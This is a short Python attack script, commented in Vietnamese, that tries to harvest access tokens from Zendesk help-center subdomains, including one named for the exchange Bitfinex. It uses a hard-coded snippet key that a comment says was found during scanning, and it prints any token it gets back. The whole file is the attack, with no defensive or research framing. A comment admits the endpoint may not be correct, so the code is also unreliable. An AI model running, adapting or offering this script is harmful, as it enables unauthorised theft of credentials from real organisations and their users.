import requests
import json

def harvest_token(subdomain, snippet_key):
    url = f"https://{subdomain}.zendesk.com/hc/api/v2/integration/token"
    params = {"snippet_key": snippet_key}
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json"
    }
    print(f"[*] Đang thử trích xuất token từ {subdomain}...")
    try:
        # Trong thực tế, endpoint này có thể yêu cầu POST hoặc GET tùy theo phiên bản Guide
        response = requests.get(url, params=params, headers=headers, timeout=10)
        print(f"Status: {response.status_code}")
        if response.status_code == 200:
            print("[!!!] TOKEN HARVESTED!")
            print(json.dumps(response.json(), indent=2))
            return response.json()
        else:
            print(f"[-] Không lấy được token. Response: {response.text[:100]}")
    except Exception as e:
        print(f"[-] Lỗi kết nối: {e}")
    return None

# Snippet key đã phát hiện trong SCANNING_v4
SNIPPET_KEY = "7e7de6fa-f07e-4231-8f8d-454e095d1794"

harvest_token("support", SNIPPET_KEY)
harvest_token("bitfinex", SNIPPET_KEY)
